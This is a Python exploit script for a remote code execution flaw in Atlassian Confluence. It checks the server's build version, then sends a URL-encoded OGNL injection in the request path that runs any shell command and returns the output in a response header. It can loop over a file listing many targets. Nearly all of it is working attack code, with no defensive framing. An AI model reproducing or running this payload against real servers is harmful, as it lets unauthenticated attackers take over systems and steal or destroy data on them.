import time
import requests
import urllib3
import re
import sys
import os.path

urllib3.disable_warnings()


def usage():
    print("\033[1;94mHow to use:\033[1;m")
    print("python3 {} https://target.com cmd [Default cmd == `whoami`]".format(sys.argv[0]))
    print("ex: python3 {} https://target.com id".format(sys.argv[0]))
    print("ex: python3 {} https://target.com 'ps aux'".format(sys.argv[0]))
    return


def check_target_version(host):
    try:
        response = requests.get("https://{}/login.action".format(host), verify=False, timeout=8)
        if response.status_code == 200:
            filter_version = re.findall("<span id='footer-build-information'>.*</span>", response.text)

            if len(filter_version) >= 1:
                version = filter_version[0].split("'>")[1].split('</')[0]
                if version in "7.4.17" or version in "7.13.7" or version in "7.14.3" or version in "7.15.2" or version in "7.16.4" or version in "7.17.4" or version in "7.18.1":
                    return False, "target is Patched. attack would be failed"
                else:
                    return True, "target is vulnerable"
            else:
                return False, "version check is failed"
        elif response.status_code == 401:
            return False, "connection is failed - Authentication is required. Status code: " + response.status_code
        else:
            return False, "connection is failed with status code: " + response.status_code
    except:
        return False, "something went very wrong, connection is failed"


def send_payload(host, command):
    payload = "%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D".format(
        command)
    response = requests.get("https://{}/{}/".format(host, payload), verify=False, allow_redirects=False, timeout=600)

    try:
        if response.status_code == 302:
            return response.headers["X-Cmd-Response"]
        else:
            return "This target has the right version, but does not seem to be vulnerable. And returns status code: " + response.status_code + " with header: " + response.headers
    except:
        return "We were unable to get a response from the target: " + host


def do_exploit(target, cmd):
    version, message = check_target_version(target)

    if version and "vulnerable" in message:
        print("Starting attack for Confluence target: \033[1;94m{}\033[1;m with command: {}".format(target, cmd))
    else:
        print("Can't find the used version for this target. Or the target: " + target + " is offline.")
        return

    exec_payload = send_payload(target, cmd)
    final_message = "For the target " + target + " the response is " + exec_payload
    print(final_message)
    return


def main():
    if len(sys.argv) < 2:
        usage()
        return

    try:
        target = sys.argv[1]
    except:
        usage()
        return

    try:
        cmd = sys.argv[2]
    except:
        cmd = "whoami"

    if not os.path.exists(target):
        do_exploit(target, cmd)
    else:
        file = open(target, "r")
        for line in file:
            try:
                line = line.split("\n")
            except:
                continue
            do_exploit(line[0], cmd)
            time.sleep(3)


if __name__ == "__main__":
    main()
